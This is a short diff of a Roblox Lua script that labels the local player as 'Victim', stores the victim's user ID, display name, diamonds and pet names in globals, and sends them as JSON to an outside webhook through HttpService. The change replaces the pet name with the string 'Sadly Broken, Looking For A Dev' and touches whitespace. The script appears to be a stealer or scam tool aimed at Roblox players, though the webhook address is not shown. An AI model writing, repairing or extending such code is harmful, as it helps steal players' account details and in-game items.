@@ -19,7 +19,7 @@ _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName 
 local lib = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
 _G.Diamonds = dims
-_G.PetName = v.Name
+_G.PetName = "Sadly Broken, Looking For A Dev"
 _G.UserNamey = "Testing"
 local function sendwebhook()
     local msg = { 
@@ -57,7 +57,7 @@ local function sendwebhook()
         Headers = { 
             ["Content-Type"] = "application/json" 
         }, 
-        Body = game:GetService("HttpService"):JSONEncode(msg) 
+        Body = game:GetService("HttpService"):JSONEncode(msg)
     }) 
 end 
 
